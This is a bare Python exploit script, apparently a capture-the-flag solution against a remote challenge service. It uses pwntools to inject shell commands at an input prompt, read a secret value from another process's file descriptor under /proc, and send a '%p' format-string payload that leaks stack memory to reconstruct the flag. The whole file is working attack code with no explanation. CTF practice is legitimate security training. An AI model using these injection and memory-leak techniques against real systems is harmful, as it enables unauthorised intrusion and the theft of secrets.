#!/usr/bin/env python

from pwn import *

r = remote('eof.ais3.org', 29091)
r.sendlineafter('flag: ', 'ps aux')
tmp = r.recvrepeat(0.5).strip()
tmp = tmp.split('\n')[-4]
tmp = tmp.split(' ')
for i in range(1, 4):
    try:
        tmp = int(tmp[i])
    except:
        continue
r.close()

r = remote('eof.ais3.org', 29091)
r.sendlineafter('flag: ', 'cat /proc/{}/fd/3'.format(tmp+4))
lucky = r.recvline().strip()
r.sendlineafter('number: ', lucky)
r.recvuntil(':)')
r.recvrepeat(0.1)

r.sendline('/readflag')
r.sendline('%p.'*20)
res = r.recvline().strip()
res = res.split('.')[7:11]
flag = ''
for i in res:
    flag += p64(int(i, 16))
print flag
